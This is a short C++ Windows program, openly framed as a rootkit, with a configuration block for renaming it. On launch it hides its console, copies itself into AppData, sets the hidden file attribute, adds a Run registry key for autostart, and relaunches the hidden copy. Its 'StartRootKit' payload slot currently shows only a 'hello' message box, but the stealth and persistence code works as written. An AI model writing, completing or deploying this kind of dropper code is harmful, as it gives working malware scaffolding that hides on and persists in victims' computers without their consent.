#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>

// ===== CONFIGURATION - CHANGE THESE VALUES =====
const wchar_t* PROGRAM_NAME = L"MyCustomApp";  // Change this to your desired name
// ===== END CONFIGURATION =====

// Generate the full executable name
std::wstring GetExeName() {
    return std::wstring(PROGRAM_NAME) + L".exe";
}

// Generate the autorun registry value name
std::wstring GetAutorunValueName() {
    return std::wstring(PROGRAM_NAME);
}

bool IsHiddenInstance() {
    WCHAR curPath[MAX_PATH];
    GetModuleFileNameW(NULL, curPath, MAX_PATH);
    
    // Check if running from appdata directory
    WCHAR targetDir[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, targetDir))) {
        std::wstring targetExe = std::wstring(targetDir) + L"\\" + GetExeName();
        return wcscmp(curPath, targetExe.c_str()) == 0;
    }
    return false;
}

void SetAutorun() {
    HKEY hKey;
    const wchar_t* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        WCHAR fullPath[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, fullPath);
        std::wstring targetExe = std::wstring(fullPath) + L"\\" + GetExeName();
        
        RegSetValueExW(hKey, GetAutorunValueName().c_str(), 0, REG_SZ, 
                      (BYTE*)targetExe.c_str(), (targetExe.length() + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
    }
}

void InstallAndHide() {
    WCHAR sourcePath[MAX_PATH];
    GetModuleFileNameW(NULL, sourcePath, MAX_PATH);
    
    WCHAR destDir[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, destDir))) {
        std::wstring targetExe = std::wstring(destDir) + L"\\" + GetExeName();
        
        // Copy to hidden location
        CopyFileW(sourcePath, targetExe.c_str(), FALSE);
        
        // Set hidden attribute
        SetFileAttributesW(targetExe.c_str(), FILE_ATTRIBUTE_HIDDEN);
        
        // Set autorun registry entry
        SetAutorun();
    }
}

void StartRootKit() {
    MessageBoxW(
        NULL,
        L"hello",
        L"hello",
        MB_OK | MB_ICONINFORMATION | MB_TOPMOST
    );
}

void LaunchHiddenCopy() {
    WCHAR destDir[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, destDir))) {
        std::wstring targetExe = std::wstring(destDir) + L"\\" + GetExeName();
        
        // Launch hidden copy
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessW(targetExe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        
        // Clean up handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    if (IsHiddenInstance()) {
        // Stealth mode - begin rootkit functionality
        StartRootKit();
    } else {
        // First run - install and hide
        InstallAndHide();
        LaunchHiddenCopy();
    }
    return 0;
}
